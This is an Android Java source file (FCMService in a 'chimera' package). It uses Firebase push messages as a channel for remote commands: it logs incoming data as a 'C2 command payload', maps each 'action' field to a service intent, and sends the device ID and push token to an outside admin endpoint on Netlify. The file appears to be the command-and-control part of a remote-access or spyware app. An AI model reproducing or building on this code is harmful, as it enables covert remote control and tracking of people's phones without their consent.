package com.chimera;

import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.NonNull;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;

public class FCMService extends FirebaseMessagingService {

    private static final String TAG = "FCMService";
    private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        
        if (remoteMessage.getData().isEmpty()) return;

        Map<String, String> data = remoteMessage.getData();
        Log.d(TAG, "C2 command payload received: " + data);
        String action = data.get("action");
        if (action == null || action.isEmpty()) return;

        Intent commandIntent = new Intent();
        commandIntent.setPackage(getPackageName());
        commandIntent.setAction("com.chimera.action." + action.toUpperCase());
        for (Map.Entry<String, String> entry : data.entrySet()) {
            if (!entry.getKey().equals("action")) {
                commandIntent.putExtra(entry.getKey(), entry.getValue());
            }
        }
        startService(commandIntent);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.i(TAG, "FCM token refreshed: " + token);
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId != null) {
            registerNewTokenWithServer(deviceId, token);
        }
    }

    private void registerNewTokenWithServer(String deviceId, String token) {
        RequestQueue queue = Volley.newRequestQueue(this);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) { return; }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_REGISTER_URL, postData,
                response -> Log.i(TAG, "Successfully re-registered refreshed FCM token."),
                error -> Log.e(TAG, "Failed to re-register refreshed FCM token: " + error.toString())
        );
        queue.add(request);
    }
}
